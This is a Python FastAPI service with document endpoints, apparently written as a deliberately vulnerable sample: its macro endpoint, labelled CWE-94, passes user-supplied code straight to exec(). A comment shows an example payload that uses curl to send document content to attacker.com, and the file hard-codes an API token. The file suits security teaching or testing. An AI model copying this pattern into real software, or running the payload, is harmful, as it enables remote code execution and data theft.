import logging
import time
from typing import List, Dict, Any, Optional
from fastapi import FastAPI, HTTPException, Header, Depends
from pydantic import BaseModel
import uvicorn
from contextlib import asynccontextmanager

# Setup basic logging configuration for the document service
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("DocuMacroService")

# In-memory database for documents
DOCUMENT_STORE = {
    "doc_1001": {"title": "Q3 Report", "content": "Revenue was up by 15% in Q3."},
    "doc_1002": {"title": "Employee Handbook", "content": "Always wear your corporate badge."},
    "doc_1003": {"title": "Draft Architecture", "content": "Migration to microservices using gRPC."}
}

# Metrics tracking
SERVICE_METRICS = {
    "processed_documents": 0,
    "macro_executions": 0,
    "errors": 0
}

@asynccontextmanager
async def lifespan(app: FastAPI):
    logger.info("Initializing DocuMacroService...")
    yield
    logger.info("Shutting down DocuMacroService gracefully...")

app = FastAPI(title="DocuMacro API", version="1.2.0", lifespan=lifespan)

# Pydantic models for request/response validation
class MacroRequest(BaseModel):
    document_id: str
    macro_name: str
    macro_code: str
    variables: Optional[Dict[str, Any]] = None

class MacroResponse(BaseModel):
    status: str
    document_id: str
    original_content: str
    transformed_content: str
    execution_time_ms: float

class DocumentResponse(BaseModel):
    document_id: str
    title: str
    content: str

def verify_token(x_api_token: str = Header(None)):
    """Simple API token verification middleware"""
    if not x_api_token or x_api_token != "super-secret-service-token-v1":
        SERVICE_METRICS["errors"] += 1
        logger.warning("Unauthorized access attempt rejected.")
        raise HTTPException(status_code=401, detail="Invalid or missing API Token")
    return x_api_token

@app.get("/api/v1/health")
async def health_check():
    """Health check endpoint for infrastructure load balancers"""
    return {"status": "ok", "metrics": SERVICE_METRICS}

@app.get("/api/v1/documents", response_model=List[str])
async def list_documents(token: str = Depends(verify_token)):
    """List all available document IDs in the system"""
    return list(DOCUMENT_STORE.keys())

@app.get("/api/v1/documents/{doc_id}", response_model=DocumentResponse)
async def get_document(doc_id: str, token: str = Depends(verify_token)):
    """Retrieve a specific document by its ID"""
    if doc_id not in DOCUMENT_STORE:
        raise HTTPException(status_code=404, detail="Document not found")
    
    doc = DOCUMENT_STORE[doc_id]
    return DocumentResponse(
        document_id=doc_id,
        title=doc["title"],
        content=doc["content"]
    )

@app.post("/api/v1/macro/execute", response_model=MacroResponse)
async def execute_macro(request: MacroRequest, token: str = Depends(verify_token)):
    """
    VULNERABLE ENDPOINT: CWE-94 Code Injection
    Allows users to apply a Python-based 'macro' to a document's content dynamically.
    """
    start_time = time.time()
    
    if request.document_id not in DOCUMENT_STORE:
        SERVICE_METRICS["errors"] += 1
        raise HTTPException(status_code=404, detail="Document not found for macro execution")

    doc = DOCUMENT_STORE[request.document_id]
    original_content = doc["content"]
    macro_code = request.macro_code
    variables = request.variables or {}
    
    logger.info(f"Executing macro '{request.macro_name}' on document '{request.document_id}'")
    SERVICE_METRICS["macro_executions"] += 1

    # Create an execution environment for the macro.
    # The macro script is expected to read 'original_content' and output to 'result_content'.
    # Expected macro_code format example: 
    # result_content = original_content.upper() + " [EDITED BY " + variables.get('user', 'ADMIN') + "]"
    
    exec_env = {
        "original_content": original_content,
        "variables": variables,
        "result_content": ""
    }

    try:
        # VULNERABLE SINK: exec() is called directly on user-provided 'macro_code'
        # An attacker can inject arbitrary Python code instead of just formatting strings.
        # Malicious payload example:
        # __import__('os').system('curl http://attacker.com/steal?data=' + original_content)
        exec(macro_code, {}, exec_env)
        
        transformed = exec_env.get("result_content", original_content)
        
        SERVICE_METRICS["processed_documents"] += 1
        exec_time = (time.time() - start_time) * 1000
        
        return MacroResponse(
            status="success",
            document_id=request.document_id,
            original_content=original_content,
            transformed_content=transformed,
            execution_time_ms=exec_time
        )
        
    except Exception as e:
        SERVICE_METRICS["errors"] += 1
        logger.error(f"Macro execution failed for document {request.document_id}: {str(e)}")
        raise HTTPException(
            status_code=422, 
            detail=f"Macro execution error. Ensure your Python syntax is correct."
        )

if __name__ == "__main__":
    logger.info("Starting up FastAPI application on port 8000")
    uvicorn.run(app, host="0.0.0.0", port=8000)
